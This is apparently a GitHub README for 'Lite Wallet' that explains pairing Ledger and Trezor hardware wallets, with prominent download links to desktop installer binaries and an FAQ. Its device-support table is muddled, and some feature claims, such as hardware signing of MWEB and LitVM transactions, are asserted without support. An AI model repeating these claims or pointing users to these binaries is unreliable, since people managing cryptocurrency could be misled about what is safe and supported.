![Lite Wallet](assets/banner-article.png)

# Using a Ledger or Trezor with Lite Wallet

Device-held keys, on-screen confirmation, and a pairing order that works.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Lite Wallet works alongside a hardware wallet: the device holds the keys, the app builds and broadcasts the transaction, and you approve on the device. Pairing is a one-time setup per machine, and from then on every send needs a physical confirmation.

## What the pairing actually gives you

A hardware wallet moves the key off the computer or phone. Lite Wallet then becomes a window: it reads balances, builds transactions and relays them, but it cannot sign without the device. Malware on the machine can lie about what you see and can refuse to send, but it cannot produce a valid signature for a payment you did not approve.

| Without a hardware wallet | With one |
|---|---|
| paper key stored on the device | key never leaves the hardware |
| malware can reach the key | malware can only request signatures |
| restore needs the twelve words | restore needs the device's own phrase |
| fast to set up | one pairing per machine |
| fine for spending money | appropriate for savings |

That last comparison is the honest one. A software wallet with a written paper key is a reasonable place for a spending balance; a hardware wallet is where a large holding belongs. [The safety guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/is-litewallet-safe-to-use.md) covers the threat model.

## Which devices are supported

The supported devices are listed by model rather than by family, because that is how support actually works: the wallet signs with these devices and no others.

| Device | Ordinary Litecoin | Notes |
|---|---|---|
| Ledger Nano S Plus, Nano X, Stax | yes | via the device's Litecoin app |
| Trezor (current models) | yes | via the device's bridge or web connection |
| Trezor Model One, Model T, Safe | yes | via the device's connection method |
| MWEB and LitVM transactions | yes | hardware signing covers them, not just standard sends |
| phone pairing | yes for supported devices | needs the right cable or connection mode |

The MWEB row is settled rather than open: hardware signing covers MWEB and LitVM transactions as well as ordinary sends, so a device can approve a confidential payment or a LitVM action, not only a standard one. [The MWEB guide](https://github.com/litewallet-dev/litecoin-wallet-transactions/blob/main/does-litewallet-support-mweb.md) covers the feature itself, and the assets that arrive with LitVM are the subject of [the LitVM guide](https://github.com/litewallet-dev/litecoin-wallet-transactions/blob/main/what-is-litvm-in-litewallet.md).

## Pairing on desktop

1. Connect the device directly, not through a hub.
2. Unlock it and open its Litecoin app.
3. In Lite Wallet, open the hardware wallet section and choose connect.
4. Approve the connection prompt on the device itself.
5. Confirm the app shows the device's addresses, not new ones.
6. Send a small test amount and approve it on the device.

Step five is the check people skip. If the addresses the app shows do not match the device's own screen, the pairing is not what you think it is, and no amount of retrying fixes a mismatched connection.

## Pairing with a phone

Pairing from a phone works over USB-C or Bluetooth, on iOS and Android. The device still approves each transaction on its own screen, which is the point of pairing it at all: the phone builds the payment, the device decides whether to sign it.

The rule that saves time: pair where you will actually sign. A phone pairing is fully supported, but the device screen is small, so read the amount and the address carefully before approving on it.

## Can I use Lite Wallet without a hardware wallet?

Yes, and it is the default. A software wallet with a written paper key is a complete, non-custodial wallet; a hardware wallet is an upgrade for holdings large enough to justify the extra step.

What you give up without one is isolation: the key lives on a general-purpose device. What you keep is the same custody model - no account, no server, no third party who can move the coins.

## Device phrase versus paper key

The device is replaceable; the phrase is not. Its own recovery phrase restores it on replacement hardware, and the coins reappear once the app rescans - the full sequence, including a device that will not connect at all, is in *the hardware connection guide*. Hardware signing itself happens on every desktop platform, with the amount and address verified on the device screen before you approve.

A hardware wallet's phrase and Lite Wallet's paper key are separate backups for separate wallets. Do not assume one covers the other, and do not enter the hardware phrase into the software wallet to "check" it - that defeats the isolation the device exists to provide.

## Keeping the device and the app in step

Firmware and app updates move independently, and the pairing is the thing that breaks when they drift apart. A device firmware update can change the connection handshake; a wallet update can change how it asks the device to sign. Neither is dangerous, and both look identical from the outside: the device is plugged in, powered and unlocked, and the app reports nothing.

The habit that avoids it is to update deliberately rather than accidentally. Update the device through the vendor's own software, update the wallet from the project's release page, and pair once afterwards on the machine you actually use. Do not update both in the middle of a payment, and do not accept a firmware prompt from a page you reached through a search result.

After any update, the first send should be small and should be read on the device screen: the amount, the destination address and the fee. A device that shows a different amount from the app is not a device you should approve. That single check catches the failure mode hardware wallets exist to prevent, which is a compromised computer telling you one thing and paying another.

One more detail worth knowing: the pairing is per machine and per connection method. A device paired over USB on a desktop is not paired over Bluetooth on a phone, and a laptop that has never seen the device will ask for the on-device approval again. That is not a fault; it is the device confirming that a new computer is asking for signatures.

## FAQ

### Can I use a Ledger or Trezor with Lite Wallet?

Yes. The device holds the keys, the app builds and broadcasts, and you approve each transaction on the device.

### Does Lite Wallet support Ledger?

Yes. Nano S Plus, Nano X and Stax sign in the desktop app through the device's Litecoin app, and pair from a phone over USB-C or Bluetooth.

### Does Lite Wallet support Trezor?

Yes. Model One, Model T and Safe are supported devices and sign through the device's connection method.

### Can I pair a Ledger with the iPhone app?

Yes. Pairing from mobile is supported over USB-C or Bluetooth, and every send is still approved on the device screen.

### Can I use Lite Wallet without a hardware wallet?

Yes. A software wallet with a written paper key is a complete non-custodial wallet; a hardware wallet adds key isolation for larger holdings.

Pairing steps match the current release, published on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
